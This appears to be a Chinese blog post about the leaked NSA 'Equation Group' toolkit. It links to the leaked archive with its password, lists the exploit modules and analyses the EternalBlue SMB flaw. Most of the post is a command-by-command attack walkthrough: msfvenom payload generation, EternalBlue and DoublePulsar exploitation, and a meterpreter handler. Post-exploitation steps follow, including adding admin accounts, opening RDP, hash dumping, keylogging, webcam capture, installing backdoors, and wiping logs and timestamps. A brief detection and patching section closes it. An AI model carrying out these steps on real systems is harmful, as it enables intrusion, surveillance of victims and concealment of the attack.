---
title: NSA方程式工具利用与分析
subtitle: 
summary: 前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。
authors:
- admin
tags: ["CVE"]
categories: ["Hack"]
date: "2017-04-28T00:00:00Z"
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
image:
  caption: ""
  focal_point: ""

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

# Shadowbroker

下载地址

<https://yadi.sk/d/NJqzpqo_3GxZA4>

**解压密码**：Reeeeeeeeeeeeeee

**github下载地址**：[https://github.com/misterch0c/shadowbroker](http://link.zhihu.com/?target=https%3A//github.com/misterch0c/shadowbroker)

释放的工具总共包含三个文件夹，

- Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。
- OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional）
- Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。

# 主要工具

## FUZZBUNCH：一款类似Metasploit的Exploit框架

|        模块        |                 漏洞                  |                           影响系统                           | 默认端口 |
| :----------------: | :-----------------------------------: | :----------------------------------------------------------: | :------: |
|       Easypi       |          IBM Lotus Notes漏洞          |                  Windows NT, 2000 ,XP, 2003                  |   3264   |
|      Easybee       | MDaemon WorldClient电子邮件服务器漏洞 |               WorldClient 9.5, 9.6, 10.0, 10.1               |    /     |
|    Eternalblue     |          SMBv2漏洞(MS17-010)          | Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64) | 139/445  |
|    Doublepulsar    |             SMB和NBT漏洞              | Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2 | 139/445  |
|   Eternalromance   |     SMBv1漏洞(MS17-010)和 NBT漏洞     |   Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2   | 139/445  |
|  Eternalchampion   |             SMB和NBT漏洞              | Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0 | 139/445  |
|   Eternalsynergy   |             SMB和NBT漏洞              |                Windows 8, Windows Server 2012                | 139/445  |
|    Explodingcan    |          IIS6.0远程利用漏洞           |                     Windows Server 2003                      |    80    |
|    Emphasismine    |               IMAP漏洞                |         IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5         |   143    |
|     Ewokfrenzy     |               IMAP漏洞                |                IBM Lotus Domino 6.5.4, 7.0.2                 |   143    |
| Englishmansdentist |               SMTP漏洞                |                              /                               |    25    |
|   Erraticgopher    |                RPC漏洞                |                 Windows XP SP3, Windows 2003                 |   445    |
|     Eskimoroll     |             kerberos漏洞              |          Windows 2000, 2003, 2003 R2, 2008, 2008 R2          |    88    |
|    Eclipsedwing    |             MS08-067漏洞              |                    Windows 2000, XP, 2003                    | 139/445  |
|  Educatedscholar   |             MS09-050漏洞              |                     Windows vista, 2008                      |   445    |
|   Emeraldthread    |             SMB和NBT漏洞              |                       Windows XP, 2003                       | 139/445  |
|     Zippybeer      |               SMTP漏洞                |                              /                               |   445    |
|    Esteemaudit     |                RDP漏洞                |               Windows XP, Windows Server 2003                |   3389   |

## ETERNALBLUE攻击原理分析

ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。

- 漏洞发生处：C:\Windows\System32\drivers\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。
- 漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)
- 触发点：_memmove(v5, (const void *)(a2 + 5 +* (_BYTE *)(a1 + 5)),* (_WORD *)(a1 + 6));
- 原因：逻辑不正确导致的越界写入

官方补丁修复前：

```
int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
{
    //SNIP...
    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &gt; v4))
    {
        *(WORD*)v6 = v3 - (_DWORD)v6; //<----------修改处
        return v1;
    }
    //SNIP...
}
int __thiscall ExecuteTransaction(int this)
{
    //SNIP...
    if (*(_DWORD *)(v3 + 0x50) &gt;= 1) //<------修改处
    {
        _SrvSetSmbError2(0, 464, &quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&quot;);
        SrvLogInvalidSmbDirect(v1, v10);
        goto LABEL_109;
    }
    //SNIP...
}
```

修复后：

```
int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
{
    //SNIP...
    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &gt; v4))
    {
        *(DWORD*)v6 = v3 - (_DWORD)v6; //<--------修改处
        return v1;
    }
    //SNIP...
}
int __thiscall ExecuteTransaction(int this)
{
    //SNIP...
    if (*(_DWORD *)(v3 + 0x50) &gt;= 2u) //<------修改处
    {
        _SrvSetSmbError2(0, 464, &quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&quot;);
        SrvLogInvalidSmbDirect(v1, v10);
        goto LABEL_109;
    }
    //SNIP...
}
```

具体见参考资料5

# **漏洞复现**

1. 环境搭建

   | 主机类型 | OS | IP |
   | :–: | :————: | :———-: |
   | 攻击机1 | win2003 | 10.10.10.130 |
   | 攻击机2 | kali linux 2.0 | 10.10.10.128 |
   | 靶机 | winXP x86 | 10.10.10.129 |

2. 工具准备

- 解压NSA工具包中的windows文件夹到攻击机1的C:\目录下（只要不是中文目录皆可）;

- 在攻击机1安装:

- [python-2.6.6.msi**](http://link.zhihu.com/?target=https%3A//www.python.org/download/releases/2.6.6/)

- [pywin32-221.win32-py2.6.exe**](http://link.zhihu.com/?target=https%3A//sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download)

- 在攻击机2先生成用于回连的dll

  ```
  msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f dll > x86bind.dll
  ```

  3.扫描开启445端口的活跃主机并探测操作系统

  ```
  nmap -Pn -p445 -O 10.10.10.0/24
  nmap -Pn -p445 -O -iL ip.txt
  ```

  4.攻击机1开始利用ETERNALBLUE攻击

  ```
  python fb.py 
  use Eternalblue ...
  ```

  5.利用Doublepulsar注入dll

  ```
  use Doublepulsar
  ```

  6.kali攻击机利用msf回连控制主机5555端口

  ```
  use exploit/multi/handler
  set payload windows/meterpreter/bind_tcp
  set LPORT 5555
  set RHOST XXX.XXX.XXX.XXX
  exploit
  ```

# **后渗透攻击**

1. 开3389端口

   - ```
     wmic /namespace:\root\cimv2\terminalservices path 
     win32_terminalservicesetting where (__CLASS != “”) call 
     setallowtsconnections 1
     ```

   - ```
     wmic /namespace:\root\cimv2\terminalservices path 
     win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
     setuserauthenticationrequired 1
     ```

   - ```
     reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
     ```

针对win XP及win2003只需要第3条命令
针对win 7需要第1，2条命令
针对win 2012需要3条命令

1. 添加账户进管理组

   ```
   net user [username] [password] /add
   net localgroup Administrators [username] /add
   ```

2. 端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接

   ```
   portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX
   rdesktop -u root -p toor 127.0.0.1:4444
   ```

3. meterpreter自带的多功能shell

   - hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文
   - screenshot:获取屏幕截图
   - webcam_snap:调取对方摄像头拍照
   - keyscan_start,keyscan_dump:记录键盘动作
   - ps:查看当前运行进程
   - sysinfo:查看系统信息
   - getsystem:提权

4. 维持控制

   - migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用

   - irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态

     ```
     irb client.core.use("railgun) client.railgun.kernel32.SetThreadExecutionState("ES_CONTINUOUS|ES_SYSTEM_REQUIRED")
     ```

   - background:隐藏在后台方便msf终端进行其他操作，session查看对话id

   - session -i X:使用已经成功获取的对话

5. 植入后门

   - 测试是否虚拟机：

     ```
     run post/windows/gather/checkvm
     ```

   - 以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载

     ```
     metsrv.dll
     run metsvc
     ```

   - getgui开启远程桌面：

     ```
     run getgui -u sherlly -p sherlly
     run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号
     ```

6. 清除入侵痕迹

- clearev:清除日志
- timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc

# **检测&防御**

1. 国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址

   countercept/doublepulsar-detection-script**

   ，使用方法

   ```
   python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX
   python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1
   ```

   另外，nmap也基于该脚本出了对应扫描脚本

   smb-double-pulsar-backdoor.nse**

   ，使用方法

   ```
   nmap -p 445 <target> --script=smb-double-pulsar-backdoor
   ```

2. 安装相应补丁[Protecting customers and evaluating risk**](http://link.zhihu.com/?target=https%3A//blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/)

3. 如非必要，关闭25, 88, 139, 445, 3389端口

4. 使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)

# **参考**

1. [Latest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network](http://link.zhihu.com/?target=http%3A//thehackernews.com/2017/04/swift-banking-hacking-tool.html)
2. [ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客**](http://link.zhihu.com/?target=http%3A//www.freebuf.com/sectool/132029.html)
3. [Leaked NSA hacking tools are a hit on the dark web - CyberScoop](http://link.zhihu.com/?target=https%3A//www.cyberscoop.com/nsa-hacking-tools-shadow-brokers-dark-web-microsoft-smb/)
4. [srv.sys Windows process - What is it?](http://link.zhihu.com/?target=http%3A//www.file.net/process/srv.sys.html)
5. [NSA Eternalblue SMB 漏洞分析](http://link.zhihu.com/?target=http%3A//blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/)
6. [smb-double-pulsar-backdoor NSE Script](http://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html)
7. [如何设置Windows 7 防火墙端口规则](http://link.zhihu.com/?target=https%3A//jingyan.baidu.com/article/c843ea0b7d5c7177931e4ab1.html)

